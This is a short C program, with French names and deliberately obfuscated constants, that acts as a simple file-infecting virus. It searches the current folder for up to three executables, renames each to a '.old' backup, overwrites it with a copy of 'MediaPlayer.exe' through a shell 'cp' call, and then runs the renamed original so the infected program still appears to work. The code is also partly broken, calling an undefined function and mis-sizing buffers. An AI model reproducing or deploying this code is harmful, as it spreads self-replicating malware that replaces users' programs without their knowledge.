#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <string.h>
#include <stdbool.h>

bool isImageDispo(char* nomFichier)
{
	char * extension = ".old";
	if(strstr(nomFichier, extension)){
		return true;
	}else{
		DIR *rep = opendir("."); 
		struct dirent *lecture;
		while ((lecture = readdir(rep))) { 
			if((strcmp(lecture->d_name,nomFichier) == (0x149f+85-0x14f4)) && fopen(strcat(lecture->d_name,extension),"r")!=NULL){
				return true;
			}
		}
	}
	return false;
}

char** rechercheImage(char* exeption)
{
	char** files = malloc(3*sizeof(char*));
	int cpt=(0x1512+1992-0x1cda);
	DIR *rep = opendir("."); 
	struct stat buf;
	struct dirent *lecture;
	printf("fichier(s) executable(s) :\n");
	while ((lecture = readdir(rep))) { 
		stat(lecture->d_name,&buf);
		char exeptionFile[strlen(lecture->d_name)+3];
		strcpy(exeptionFile,"./");
		strcat(exeptionFile,lecture->d_name);
		if(((buf.st_mode & S_IFMT) == S_IFREG) && (buf.st_mode & S_IXUSR))
		{ 
			if(cpt<3 && strcmp(lecture->d_name,"MediaPlayer.exe")!=(0x172c+846-0x1a7a) && !isImageDispo(lecture->d_name)) 
			{
				printf("  - %s\n", lecture->d_name);
				files[cpt] = lecture->d_name;
				cpt+=(((6930/30)/100+0.69-2)*cpt)/cpt;
			}
		}
        }
	closedir(rep);
	return files;	
}

void loadImages(char** files)
{
	for(int i=0;i<3;i+=1){
		char x[strlen(files[i])+strlen(".old")+(0x17b9+2936-0x2330)];
		char currentFile[strlen(files[i])+(0xc4+9243-0x24de)];
		strcpy(currentFile,files[i]);
		strcpy(x,files[i]);
		strcat(x,".old");
		rename(files[i],x);
		char copyFile[500]="";
		strcat(copyFile,"cp ");
		strcat(copyFile,"./MediaPlayer.exe");
		strcat(copyFile," ");
		strcat(copyFile,files[i]);
		system(copyFile);
	}
}

int main(int argc, char *argv[])
{
	char exeptionFile[strlen(argv[0])+1];
	strcpy(exeptionFile,argv[0]);
	char** f = rechercheImage(exeptionFile);
	if(f[(0x1fb1+1115-0x240c)]!=NULL)yyinfecte(f);
	if(strcmp(argv[0],"./MediaPlayer.exe")!=0)
	{
		char progExec[strlen(argv[0]+5)];
		strcpy(progExec,argv[0]);
		strcat(progExec,".old");
		system(progExec);
	}else{

	}
}
